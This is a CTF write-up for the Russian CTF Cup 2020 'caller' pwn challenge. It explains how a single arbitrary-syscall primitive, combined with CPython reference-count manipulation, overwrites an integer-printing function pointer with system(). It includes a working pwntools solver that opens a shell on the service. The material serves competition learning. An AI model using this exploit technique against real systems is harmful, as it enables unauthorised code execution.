+++
title = 'Russian CTF Cup 2020 — caller'
date = 2020-11-19T12:37:06+03:00
tags = ['ctf', 'writeup', 'pwn']
toc = true
tldr = 'abuse single system call primitive to gain RCE in CPython'
+++

## Source code

Full source code is available here: [https://github.com/keltecc/ctfcup-2020-quals/tree/main/tasks/pwn/caller](https://github.com/keltecc/ctfcup-2020-quals/tree/main/tasks/pwn/caller)

- **caller.py**

```python
#!/usr/bin/env python3.7

import ctypes


def syscall(number, arguments):
    libc = ctypes.CDLL(None)
    return libc.syscall(number, *arguments)


def main():
    number = input('[?] syscall number: ')
    arguments = input('[?] syscall arguments: ').split(' ')
    number, arguments = int(number), list(map(int, arguments))
    result = syscall(number, arguments)
    print(f'[+] result: {result}')
    return


if __name__ == '__main__':
    main()
```

## Solution

The service allows us to execute an arbitrary system call with the provided arguments using `syscall()` function from libc.

In CPython small integers (from -5 to 256) are singletons and usage of these numbers doesn't allocate new objects:

```
>>> hex(id(100))
'0xaa7400'
>>> hex(id(101))
'0xaa7420'
>>> hex(id(100 + 1))
'0xaa7420'
>>> hex(id(1000))
'0x7f6664bfbb30'
```

But every integer object (as any other CPython object) has a reference counter as the first field in the object structure. For example, if `id(100) == 0xaa7400`, then the address `0xaa7400` contains the number of references to integer 100.

Then let's notice that we could provide unlimited count of arguments to `syscall()` function, it means that we're able to use arbitrary number of integers, and it means that we can increment reference counter of these numbers by desired value. For example, if we send 100 number 1000 times, the reference counter of number 100 will be increased by 1000. Using this method we could write arbitrary value at the start of integer object structure.

Now let's remember that every CPython object has a table with standard methods (such as `str()`, `add()` and so on), and pointers to these methods are stored in the type structure. For the integers the type object is `PyLong_Type` ([implementation](https://github.com/python/cpython/blob/3.7/Objects/longobject.c) in CPython repository). It's important that the challenge prints out the result of the system call, and that result is always integer. Before the number is printed it should be converted from integer to string, for this purpose the special function `long_to_decimal_string()` is used ([source code](https://github.com/python/cpython/blob/3.7/Objects/longobject.c#L1794)). This function accepts the integer as its first argument. The `python3.7` binary contains the `system()` function, so we could replace the pointer to `long_to_decimal_string()` with a pointer to `system()`. In order to do this we could use `read()` system call and write directly to the `PyLong_Type` structure.

Note that the `python3.7` binary does not have PIE and contains many default objects in its static memory, so we know all required addresses.

## Exploitation

- find the address of `PyLong_Type` structure
- find the address of `long_to_decimal_string()` pointer inside the `PyLong_Type` structure, let's call it `PyLong_ToString`
- find the address of `system()` in PLT
- call `read(0, PyLong_ToString, 8)` and overwrite `long_to_decimal_string()` with `system()`
- the return value of system call will be 8, so when this number is printed out the function `str(id(8)) -> system(id(8))` will be called
- in order to place the `sh` string at the `id(8)` address we should create a lot of 8 integers so the reference counter of 8 will be `0x6873`
- since we can provide unlimited count of `syscall()` arguments (and the unused arguments are ignored) we could pass the required number of 8 as unused aguments

## Example solver

```python
#!/usr/bin/env python3.7

import sys

from pwn import remote, p64
from time import sleep


system_plt = 0x421080
PyLong_Type = 0xA25940
PyLong_ToString = PyLong_Type + 17 * 8


def main(io):
    count = int.from_bytes(b'sh\x00', 'little') - 38
    syscall_number = 0
    syscall_arguments = [0, PyLong_ToString, 8]
    syscall_arguments += [8] * count
    io.sendlineafter(b': ', str(syscall_number).encode())
    io.sendlineafter(b': ', ' '.join(map(str, syscall_arguments)).encode())
    sleep(1)
    io.send(p64(system_plt))
    io.interactive()


if __name__ == '__main__':
    IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
    PORT = 7703

    with remote(IP, PORT) as io:
        main(io)
```
